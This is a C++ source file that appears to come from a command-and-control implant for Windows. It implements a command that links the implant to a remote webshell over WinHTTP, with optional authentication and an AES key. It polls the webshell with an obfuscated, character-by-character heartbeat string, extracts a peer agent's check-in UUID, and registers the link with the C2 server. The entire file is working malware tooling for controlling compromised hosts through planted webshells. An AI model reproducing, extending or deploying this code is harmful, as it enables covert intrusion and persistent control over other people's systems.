#include <common.h>
#include <commands.h>
#include <transport_webshell.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <base64.h>

#ifdef INCLUDE_CMD_LINK_WEBSHELL

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_link_webshell(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // parse parameters (packed by translator in order):
    // url, auth_method(byte), auth_name, auth_value, aes_key(32 bytes or 0), param_name

    uint32_t url_len = 0;
    auto url = parser_string( params, &url_len );
    if ( !url || url_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing url" ) ) );
        return;
    }

    uint8_t auth_method = parser_byte( params );

    uint32_t auth_name_len = 0;
    auto auth_name = parser_string( params, &auth_name_len );

    uint32_t auth_value_len = 0;
    auto auth_value = parser_string( params, &auth_value_len );

    uint32_t aes_key_len = 0;
    auto aes_key_raw = parser_bytes( params, &aes_key_len );

    uint32_t param_name_len = 0;
    auto param_name = parser_string( params, &param_name_len );

    if ( !param_name || param_name_len == 0 ) {
        param_name = symbol<char*>( const_cast<char*>( "data" ) );
        param_name_len = 4;
    }

    // initialize WinHTTP if needed
    if ( !inst.webshell_link_state ) {
        auto state = static_cast<WebshellLinkState*>(
            inst.heap_alloc( sizeof( WebshellLinkState ) ) );
        if ( !state ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
            return;
        }
        memory::zero( state, sizeof( WebshellLinkState ) );
        inst.webshell_link_state = state;
    }

    auto state = static_cast<WebshellLinkState*>( inst.webshell_link_state );
    if ( !ws_resolve_winhttp( inst, state ) ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "failed to load winhttp" ) ) );
        return;
    }

    // create link struct
    auto link = static_cast<instance::WebshellLink*>(
        inst.heap_alloc( sizeof( instance::WebshellLink ) ) );
    if ( !link ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    memory::zero( link, sizeof( instance::WebshellLink ) );
    memory::copy( link->task_uuid, task_uuid, 36 );
    link->link_id    = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
    link->auth_method = auth_method;

    // copy URL
    link->url = static_cast<char*>( inst.heap_alloc( url_len + 1 ) );
    if ( link->url ) {
        memory::copy( link->url, url, url_len );
        link->url[url_len] = '\0';
    }

    // copy auth name
    if ( auth_name && auth_name_len > 0 ) {
        link->auth_name = static_cast<char*>( inst.heap_alloc( auth_name_len + 1 ) );
        if ( link->auth_name ) {
            memory::copy( link->auth_name, auth_name, auth_name_len );
            link->auth_name[auth_name_len] = '\0';
        }
    }

    // copy auth value
    if ( auth_value && auth_value_len > 0 ) {
        link->auth_value = static_cast<char*>( inst.heap_alloc( auth_value_len + 1 ) );
        if ( link->auth_value ) {
            memory::copy( link->auth_value, auth_value, auth_value_len );
            link->auth_value[auth_value_len] = '\0';
        }
    }

    // copy AES key (32 bytes)
    if ( aes_key_raw && aes_key_len == 32 ) {
        link->aes_key = static_cast<uint8_t*>( inst.heap_alloc( 32 ) );
        if ( link->aes_key ) {
            memory::copy( link->aes_key, aes_key_raw, 32 );
        }
    }

    // copy param name
    link->param_name = static_cast<char*>( inst.heap_alloc( param_name_len + 1 ) );
    if ( link->param_name ) {
        memory::copy( link->param_name, param_name, param_name_len );
        link->param_name[param_name_len] = '\0';
    }

    // test connectivity by polling the webshell
    char poll_cmd[] = { 'p','o','l','l','_','p','2','p','|','h','e','a','r','t','b','e','a','t', 0 };

    uint8_t* resp     = nullptr;
    uint32_t resp_len = 0;

    if ( !ws_http_post( inst, state, link,
            reinterpret_cast<uint8_t*>( poll_cmd ), 18,
            &resp, &resp_len ) ) {
        // cleanup
        if ( link->url )        inst.heap_free( link->url );
        if ( link->auth_name )  inst.heap_free( link->auth_name );
        if ( link->auth_value ) inst.heap_free( link->auth_value );
        if ( link->aes_key )    inst.heap_free( link->aes_key );
        if ( link->param_name ) inst.heap_free( link->param_name );
        inst.heap_free( link );

        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "webshell unreachable" ) ) );
        return;
    }

    link->connected = true;

    // check if poll returned P2P checkin data
    uint8_t* p2p_data   = nullptr;
    uint32_t p2p_len    = 0;

    if ( resp && resp_len > 0 ) {
        uint32_t pipes = 0;
        uint32_t data_start = 0;
        for ( uint32_t i = 0; i < resp_len; i++ ) {
            if ( resp[i] == '|' ) {
                pipes++;
                if ( pipes == 2 ) {
                    data_start = i + 1;
                    break;
                }
            }
        }
        if ( data_start > 0 && data_start < resp_len ) {
            p2p_len  = resp_len - data_start;
            p2p_data = resp + data_start;
        }
    }

    // extract agent UUID from P2P checkin data
    // format: checkin|<uuid>|<host>|<os>|...
    if ( p2p_data && p2p_len > 8 ) {
        uint32_t first_pipe = 0;
        bool found_first = false;
        for ( uint32_t i = 0; i < p2p_len; i++ ) {
            if ( p2p_data[i] == '|' ) {
                first_pipe = i + 1;
                found_first = true;
                break;
            }
        }
        if ( found_first && first_pipe < p2p_len ) {
            uint32_t second_pipe = p2p_len;
            for ( uint32_t i = first_pipe; i < p2p_len; i++ ) {
                if ( p2p_data[i] == '|' ) {
                    second_pipe = i;
                    break;
                }
            }
            uint32_t uuid_len = second_pipe - first_pipe;
            if ( uuid_len == 36 ) {
                link->agent_id = static_cast<char*>( inst.heap_alloc( 37 ) );
                if ( link->agent_id ) {
                    memory::copy( link->agent_id, p2p_data + first_pipe, 36 );
                    link->agent_id[36] = '\0';
                }
            }
        }
    }

    // add to linked list
    link->next = inst.webshell_links;
    inst.webshell_links = link;

    DBG_PRINT( inst, "link_webshell: connected link_id=%d agent=%s url=%s\n",
        link->link_id,
        link->agent_id ? link->agent_id : "pending",
        link->url );

    // queue ACTION_LINK_ADD
    auto pkg = package_create( inst );
    if ( !pkg ) {
        if ( resp ) inst.heap_free( resp );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    package_add_byte( inst, pkg, ACTION_LINK_ADD );
    package_add_byte( inst, pkg, C2_PROFILE_WEBSHELL );
    package_add_int32( inst, pkg, link->link_id );
    package_add_string( inst, pkg, link->agent_id ? link->agent_id :
        symbol<char*>( const_cast<char*>( "" ) ) );

    // include P2P checkin data if present
    if ( p2p_data && p2p_len > 0 ) {
        package_add_bytes( inst, pkg, p2p_data, p2p_len );
    } else {
        package_add_int32( inst, pkg, 0 );
    }

    if ( resp ) inst.heap_free( resp );

    uint32_t data_len = 0;
    auto data = package_build( pkg, &data_len );

    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if ( needed > inst.response_queue.capacity ) {
        uint32_t nc = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
        while ( nc < needed ) nc *= 2;
        auto tmp = static_cast<uint8_t*>(
            inst.heap_realloc( inst.response_queue.buffer, nc ) );
        if ( tmp ) {
            inst.response_queue.buffer   = tmp;
            inst.response_queue.capacity = nc;
        }
    }

    if ( inst.response_queue.length + 4 + data_len <= inst.response_queue.capacity ) {
        auto buf = inst.response_queue.buffer + inst.response_queue.length;
        buf[0] = (data_len >> 24) & 0xFF;
        buf[1] = (data_len >> 16) & 0xFF;
        buf[2] = (data_len >> 8)  & 0xFF;
        buf[3] = data_len & 0xFF;
        memory::copy( buf + 4, data, data_len );
        inst.response_queue.length += 4 + data_len;
    }

    package_destroy( inst, pkg );

    uint32_t url_sz = link->url ? str_len( link->url ) : 0;
    uint32_t aid_sz = link->agent_id ? 36 : 7; // "pending"
    uint32_t msg_sz = 17 + url_sz + 9 + aid_sz + 1; // "Linked webshell: " + url + "\nAgent: " + id
    auto resp_buf = static_cast<char*>( inst.heap_alloc( msg_sz ) );
    if ( resp_buf ) {
        str_copy( resp_buf, symbol<char*>( const_cast<char*>( "Linked webshell: " ) ) );
        if ( link->url ) str_concat( resp_buf, link->url );
        str_concat( resp_buf, symbol<char*>( const_cast<char*>( "\nAgent: " ) ) );
        str_concat( resp_buf, link->agent_id ? link->agent_id :
            symbol<char*>( const_cast<char*>( "pending" ) ) );
        queue_response( inst, task_uuid, RESPONSE_SUCCESS, resp_buf );
        inst.heap_free( resp_buf );
    } else {
        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>( "Linked webshell" ) ) );
    }
}

#endif
